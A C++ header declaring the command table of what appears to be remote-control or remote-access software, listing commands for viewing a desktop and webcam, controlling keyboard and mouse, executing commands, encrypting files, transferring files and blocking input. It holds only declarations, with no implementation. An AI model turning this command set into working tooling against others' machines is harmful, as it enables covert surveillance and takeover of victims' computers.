#pragma once

#ifndef __COMMANDPROPERTIES_HPP_INCLUDED__
#define __COMMANDPROPERTIES_HPP_INCLUDED__

enum class Commands : size_t
{
	UNDEFINED_COMMAND,

	MESSAGEBOX,
	VIEWDESKTOP_START,
	VIEWDESKTOP_STOP,
	VIEWWEBCAM_START,
	VIEWWEBCAM_STOP,
	KEYBOARDCTRL,
	MOUSECTRL,
	EXECUTECMD,
	ENCRYPTFILE,
	DECRYPTFILE,
	IMPORTFILE,
	EXPORTFILE,
	BLOCKINPUT,
	PLAYSOUND,

	NUMBER_OF_COMMANDS
};

enum class COMMAND_IN_PROGRESS_BITS : size_t
{
	DESKTOP_VIEW,
	WEBCAM_VIEW,

	NUMBER_OF_BITS
};

using CIP_BITS = COMMAND_IN_PROGRESS_BITS;

struct CommandProperties
{
	using command_t            = std::tuple<Commands, std::string>;
	using exec_func_t          = std::function<bool(const std::vector<std::string>&)>;
	using threaded_exec_func_t = std::function<void(const std::vector<std::string>&, std::bitset<static_cast<size_t>(CIP_BITS::NUMBER_OF_BITS)>, size_t)>;
	using func_t               = std::variant<exec_func_t, threaded_exec_func_t>;

	command_t command;
	func_t    exec_func;
};

extern const std::array<CommandProperties, static_cast<size_t>(Commands::NUMBER_OF_COMMANDS)> COMMAND_PROPERTIES;

bool _onCmd_MESSAGEBOX(const std::vector<std::string>&);

#endif /* __COMMANDPROPERTIES_HPP_INCLUDED__ */